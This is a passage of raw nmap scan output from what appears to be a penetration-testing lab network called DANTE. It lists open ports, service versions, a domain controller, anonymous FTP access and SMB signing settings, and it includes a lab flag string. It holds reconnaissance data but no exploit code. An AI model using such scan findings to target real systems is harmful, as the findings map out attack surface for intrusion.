|   256 04:fb:b6:1a:db:95:46:b7:22:13:61:24:76:80:1e:b8 (ECDSA)
|_  256 ae:c4:55:67:6e:be:ba:65:54:a3:c3:fc:08:29:24:0e (ED25519)
80/tcp   open  http     Apache httpd 2.4.43 ((Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3)
|_http-server-header: Apache/2.4.43 (Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3
| http-title: Welcome to XAMPP
|_Requested resource was http://172.16.1.12/dashboard/
443/tcp  open  ssl/http Apache httpd 2.4.43 ((Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3)
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost/organizationName=Apache Friends/stateOrProvinceName=Berlin/countryName=DE
| Not valid before: 2004-10-01T09:10:30
|_Not valid after:  2010-09-30T09:10:30
|_http-server-header: Apache/2.4.43 (Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3
|_ssl-date: TLS randomness does not represent time
| http-title: Welcome to XAMPP
|_Requested resource was https://172.16.1.12/dashboard/
3306/tcp open  mysql?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, NULL, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|_    Host '172.16.1.100' is not allowed to connect to this MariaDB server
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.94SVN%I=7%D=12/17%Time=6942FF0A%P=x86_64-pc-linux-gnu%
SF:r(NULL,4B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20
SF:allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(Generic
SF:Lines,4B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20a
SF:llowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(GetReque
SF:st,4B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allo
SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(HTTPOptions
SF:,4B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowe
SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(RTSPRequest,4
SF:B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\
SF:x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(RPCCheck,4B,"G\
SF:0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x20to
SF:\x20connect\x20to\x20this\x20MariaDB\x20server")%r(DNSVersionBindReqTCP
SF:,4B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowe
SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(DNSStatusRequ
SF:estTCP,4B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20
SF:allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(Help,4B
SF:,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x
SF:20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SSLSessionReq,4B
SF:,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x
SF:20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(TerminalServerCo
SF:okie,4B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20al
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(TLSSessio
SF:nReq,4B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20al
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(Kerberos,
SF:4B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed
SF:\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SMBProgNeg,4B,
SF:"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x2
SF:0to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(X11Probe,4B,"G\0\
SF:0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x20to\x
SF:20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 172.16.1.13
Host is up.
All 65535 scanned ports on 172.16.1.13 are in ignored states.
Not shown: 65535 filtered tcp ports (no-response)

Nmap scan report for 172.16.1.17
Host is up (0.069s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.41
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 37M   2020-06-25 13:00  webmin-1.900.zip
| -     2020-07-13 02:21  webmin/
|_
|_http-title: Index of /
|_http-server-header: Apache/2.4.41 (Ubuntu)
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
10000/tcp open  http        MiniServ 1.900 (Webmin httpd)
|_http-title: Login to Webmin
| http-robots.txt: 1 disallowed entry 
|_/
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.94SVN%I=7%D=12/17%Time=6942FF10%P=x86_64-pc-linux-gnu
SF:%r(NULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\
SF:x0b\x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HT
SF:TPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0
SF:\x0b\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNS
SF:VersionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestT
SF:CP,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\
SF:x0fInvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a
SF:\0")%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08
SF:\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCo
SF:okie,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x
SF:0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20messa
SF:ge\"\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgN
SF:eg,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\
SF:x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x0
SF:5HY000")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDStr
SF:ing,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0
SF:b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20messag
SF:e\"\x05HY000")%r(LDAPBindReq,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SIPOpt
SF:ions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LANDesk-RC,9,"\x05\0\0\0\x0b\x
SF:08\x05\x1a\0")%r(TerminalServer,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NCP
SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC,2B,"\x05\0\0\0\x0b\x08\x0
SF:5\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05H
SF:Y000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(WMSRequest,9,"\x05
SF:\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,9,"\x05\0\0\0\x0b\x08\x05\x1a\0
SF:")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(afp,2B,"\x05\0\0\0\x0
SF:b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20messag
SF:e\"\x05HY000")%r(giop,9,"\x05\0\0\0\x0b\x08\x05\x1a\0");
Service Info: Host: 127.0.0.1

Host script results:
|_clock-skew: 2s
| smb2-time: 
|   date: 2025-12-17T19:09:04
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: DANTE-NIX03, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Nmap scan report for 172.16.1.19
Host is up (0.068s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.41
|_http-title: Index of /
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp  open  http    Jetty 9.4.27.v20200227
|_http-server-header: Jetty(9.4.27.v20200227)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   NotesRPC, SSLSessionReq: 
|     Invalid message"
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.94SVN%I=7%D=12/17%Time=6942FF15%P=x86_64-pc-linux-gnu
SF:%r(GenericLines,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\
SF:0\0\x0b\x08\x05\x1a\0")%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\
SF:0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")
SF:%r(SMBProgNeg,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SIPOptions,9,"\x05\0\
SF:0\0\x0b\x08\x05\x1a\0")%r(NotesRPC,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e
SF:\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(ms
SF:-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x1a\0");
Service Info: Host: 127.0.0.1

Nmap scan report for 172.16.1.20
Host is up (0.067s latency).
Not shown: 65502 closed tcp ports (reset)
Bug in http-title: no string output.
Bug in http-title: no string output.
PORT      STATE SERVICE            VERSION
22/tcp    open  ssh                OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 15:19:e6:66:c3:4f:f7:80:7e:48:f7:b9:9a:f9:ee:08 (RSA)
|_  256 42:ca:16:67:5a:e7:a2:01:b0:63:4b:f7:ed:55:db:90 (ED25519)
53/tcp    open  domain             Simple DNS Plus
80/tcp    open  http               Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 1 disallowed entry 
|_/ 
88/tcp    open  kerberos-sec       Microsoft Windows Kerberos (server time: 2025-12-17 19:05:47Z)
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
389/tcp   open  ldap               Microsoft Windows Active Directory LDAP (Domain: DANTE.local, Site: Default-First-Site-Name)
443/tcp   open  ssl/http           Microsoft IIS httpd 8.5
| http-robots.txt: 1 disallowed entry 
|_/ 
| http-methods: 
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=DANTE-DC01
| Subject Alternative Name: othername: UPN::S-1-5-21-2273245918-2602599687-2649756301-1003
| Not valid before: 2020-08-07T09:32:48
|_Not valid after:  2025-08-06T09:32:48
|_ssl-date: 2025-12-17T19:09:30+00:00; -5s from scanner time.
|_http-server-header: Microsoft-IIS/8.5
445/tcp   open  microsoft-ds       Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: DANTE)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http         Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap               Microsoft Windows Active Directory LDAP (Domain: DANTE.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2025-12-17T19:09:29+00:00; -6s from scanner time.
| ssl-cert: Subject: commonName=DANTE-DC01.DANTE.local
| Not valid before: 2025-12-16T09:06:52
|_Not valid after:  2026-06-17T09:06:52
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8912/tcp  open  wcbackup           Windows Client Backup service
9389/tcp  open  mc-nmf             .NET Message Framing
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49157/tcp open  ncacn_http         Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
49171/tcp open  msrpc              Microsoft Windows RPC
49181/tcp open  msrpc              Microsoft Windows RPC
49182/tcp open  msrpc              Microsoft Windows RPC
49184/tcp open  msrpc              Microsoft Windows RPC
49237/tcp open  msrpc              Microsoft Windows RPC
65500/tcp open  ssl/http           Microsoft IIS httpd 8.5
| ssl-cert: Subject: commonName=DANTE-DC01
| Subject Alternative Name: othername: UPN::S-1-5-21-2273245918-2602599687-2649756301-1003
| Not valid before: 2020-08-07T09:32:48
|_Not valid after:  2025-08-06T09:32:48
|_http-title: 403 - Forbidden: Access is denied.
|_http-server-header: Microsoft-IIS/8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_ssl-date: 2025-12-17T19:09:29+00:00; -6s from scanner time.
65520/tcp open  ssl/http           Microsoft IIS httpd 8.5
|_http-title: 403 - Forbidden: Access is denied.
|_http-server-header: Microsoft-IIS/8.5
| ssl-cert: Subject: commonName=DANTE-DC01
| Subject Alternative Name: othername: UPN::S-1-5-21-2273245918-2602599687-2649756301-1003
| Not valid before: 2020-08-07T09:32:48
|_Not valid after:  2025-08-06T09:32:48
|_ssl-date: 2025-12-17T19:09:29+00:00; -6s from scanner time.
Service Info: Host: DANTE-DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
|   Computer name: DANTE-DC01
|   NetBIOS computer name: DANTE-DC01\x00
|   Domain name: DANTE.local
|   Forest name: DANTE.local
|   FQDN: DANTE-DC01.DANTE.local
|_  System time: 2025-12-17T19:09:00+00:00
| smb2-security-mode: 
|   3:0:2: 
|_    Message signing enabled and required
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_nbstat: NetBIOS name: DANTE-DC01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:29:ec (VMware)
| smb2-time: 
|   date: 2025-12-17T19:09:03
|_  start_date: 2025-12-17T09:08:59
|_clock-skew: mean: -3s, deviation: 6s, median: -6s

Nmap scan report for 172.16.1.100
Host is up (0.067s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    4 0        0            4096 Apr 14  2021 Transfer
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.16.1.100
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 8f:a2:ff:cf:4e:3e:aa:2b:c2:6f:f4:5a:2a:d9:e9:da (RSA)
|_  256 13:45:c5:ca:db:a6:b4:ae:9c:09:7d:21:cd:9d:74:f4 (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 2 disallowed entries 
|_/wordpress DANTE{Y0u_Cant_G3t_at_m3_br0!}
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|_    HY000
65000/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 2 disallowed entries 
|_/wordpress DANTE{Y0u_Cant_G3t_at_m3_br0!}
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.94SVN%I=7%D=12/17%Time=6942FF17%P=x86_64-pc-linux-gnu
SF:%r(NULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\
SF:x0b\x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HT
SF:TPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0
SF:\x0b\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNS
SF:VersionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestT
SF:CP,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\
SF:x0fInvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a
SF:\0")%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08
SF:\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCo
SF:okie,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x
SF:0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20messa
SF:ge\"\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgN
SF:eg,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\
SF:x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x0
SF:5HY000")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDStr
SF:ing,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0
SF:b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20messag
SF:e\"\x05HY000")%r(LDAPBindReq,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SIPOpt
SF:ions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LANDesk-RC,9,"\x05\0\0\0\x0b\x
SF:08\x05\x1a\0")%r(TerminalServer,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NCP
SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC,2B,"\x05\0\0\0\x0b\x08\x0
SF:5\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05H
SF:Y000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(WMSRequest,9,"\x05
SF:\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,9,"\x05\0\0\0\x0b\x08\x05\x1a\0
SF:")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(afp,2B,"\x05\0\0\0\x0
SF:b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20messag
SF:e\"\x05HY000")%r(giop,9,"\x05\0\0\0\x0b\x08\x05\x1a\0");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 172.16.1.101
Host is up (0.068s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: DANTE-WS02, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:92:b8 (VMware)
| smb2-time: 
|   date: 2025-12-17T20:09:06
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: 59m59s

Nmap scan report for 172.16.1.102
Host is up (0.083s latency).
Not shown: 65516 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/7.4.0)
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.0
|_http-title: Dante Marriage Registration System :: Home Page
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/7.4.0)
|_ssl-date: TLS randomness does not represent time
|_http-title: Dante Marriage Registration System :: Home Page
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=localhost/organizationName=TESTING CERTIFICATE
| Subject Alternative Name: DNS:localhost
| Not valid before: 2022-06-24T01:07:25
|_Not valid after:  2022-12-24T01:07:25
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.0
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql         MySQL (unauthorized)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DANTE-WS03
| Not valid before: 2025-12-16T09:06:08
|_Not valid after:  2026-06-17T09:06:08
| rdp-ntlm-info: 
|   Target_Name: DANTE-WS03
|   NetBIOS_Domain_Name: DANTE-WS03
|   NetBIOS_Computer_Name: DANTE-WS03
|   DNS_Domain_Name: DANTE-WS03
|   DNS_Computer_Name: DANTE-WS03
|   Product_Version: 10.0.19041
|_  System_Time: 2025-12-17T19:09:08+00:00
|_ssl-date: 2025-12-17T19:09:33+00:00; -1s from scanner time.
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns: 
|     Invalid message-frame."
|_    HY000
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.94SVN%I=7%D=12/17%Time=6942FF29%P=x86_64-pc-linux-gnu
SF:%r(NULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\
SF:x0b\x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HT
SF:TPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0
SF:\x0b\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNS
SF:VersionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestT
SF:CP,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\
SF:x0fInvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a
SF:\0")%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08
SF:\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCo
SF:okie,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x
SF:0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20messa
SF:ge\"\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgN
SF:eg,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\
SF:x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x0
SF:5HY000")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDStr
SF:ing,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0
SF:b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20messag
SF:e\"\x05HY000")%r(LDAPBindReq,46,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\
SF:x01\x08\x01\x10\x88'\x1a\*Parse\x20error\x20unserializing\x20protobuf\x
SF:20message\"\x05HY000")%r(SIPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r
SF:(LANDesk-RC,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\
SF:0\0\0\x0b\x08\x05\x1a\0")%r(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(Not
SF:esRPC,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x
SF:1a\x0fInvalid\x20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x
SF:05\x1a\0")%r(WMSRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,
SF:32,"\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'\x1a\x16Inv
SF:alid\x20message-frame\.\"\x05HY000")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x
SF:05\x1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01
